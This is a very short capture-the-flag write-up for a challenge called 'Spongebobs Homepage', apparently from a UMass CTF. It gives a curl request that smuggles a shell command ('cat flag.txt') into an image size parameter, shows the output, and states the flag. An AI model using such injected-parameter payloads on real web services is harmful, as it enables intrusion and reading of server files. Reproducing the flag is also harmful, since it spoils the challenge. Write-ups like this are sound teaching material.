# Spongebobs Homepage

---
There is a command injection in the size parameter for images loading.

```
curl "spongebobs_homepage.ctf.umasscybersec.org/assets/image?name=spongebob&size=200x200;cat%20flag.txt;echo%20"
UMASS{B4S1C_CMD_INJ3CTI0N}! png:-
```

FLAG: UMASS{B4S1C_CMD_INJ3CTI0N}
